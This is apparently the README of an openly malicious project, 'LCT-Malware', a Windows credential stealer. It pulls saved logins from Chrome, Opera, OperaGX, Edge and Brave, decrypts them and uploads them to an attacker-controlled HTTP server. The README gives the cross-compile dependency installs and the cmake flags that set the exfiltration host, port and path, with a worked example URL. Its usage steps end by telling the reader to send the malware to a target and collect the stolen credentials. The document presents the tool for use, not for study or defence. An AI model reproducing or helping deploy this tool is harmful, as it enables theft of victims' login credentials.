# About Project

The purpose of the LCT-Malware ( Login Credentials Theif - Malicious Software ) is to dump target's login credentials that has been saved in the browsers' databases, and upload them in attacker's server.


It follows the decryption process in the victim's system ( as some decryption functions depend on the victim's system ).
Then it checks the connection between attacker and the victim, to see if the server is available. if somehow the server didn't respond to the attacker, it will go to "Busy Sleep" until the server become available again.

**Note:** *The Current Version of Malware ONLY Runs in Windows Systems*

# Target Browsers of Malware
  - Chrome
  - Opera
  - OperaGX
  - Microsoft Edge
  - Brave

# Dependencies
<h3> Runtime Dependencies: </h3>

  - Windows API ( Baked into every victim's system )
  - LibSodium  ( Specified by the program )
  - Sqlite3    ( Specified by the program )

**Note:** *So you dont need to play around with dependencies as they are always available*

<h3> Build Dependencies: </h3>

  - CMake
  - Windows Compiler

# Configuration
Installing Build Dependencies in Debian Based OS:
```
sudo apt install binutils-mingw-w64-x86-64 gcc-mingw-w64-x86-64-win32 gcc-mingw-w64-base mingw-w64-common mingw-w64-x86-64-dev
```

Installing Build Dependencies in Arch Based OS:
```
sudo pacman -S mingw-w64-binutils mingw-w64-crt mingw-w64-gcc mingw-w64-headers mingw-w64-winpthreads
```

<h3> Project Configuration Flags: </h3>

  * -DHOSTNAME
  * -DPORT
  * -DPATH

HOSTNAME can be either IP or Hostname, this specifies the address that malware is going to send the dumped login credentials. <br>
PORT specifies HTTP port on the reciever's system. ( by Default 80 ) <br>
PATH specifies the Path of them reciever's HTTP Server. ( by default "/" )

for example this configuration:
```
cmake -Bbuild -DHOSTNAME="192.168.1.1" -DPORT=5656 -DPATH=/app
```

will upload credentials to this location: `http://192.168.1.1:5656/app`

**Note:** *`-B` flag specifies build directory*

# Usage

1.install build dependencies with the instructions above. <br>
2.then configure project with your system ( or maybe your server ) <br>
3.build the project using following command:
```
cmake --build {BuildDir}
```

**Note:** *replace the {BuildDir} with your Build Directory*

4.Start your listener in your system ( or maybe your server ) <br>
**Note:** *The Listener should look for 'document' part of the POST form to recieve file* <br>
5.then send the malware to your target. <br>
6.Wait for execution and receive delicious information :)

# Contributors
  - iHapiW
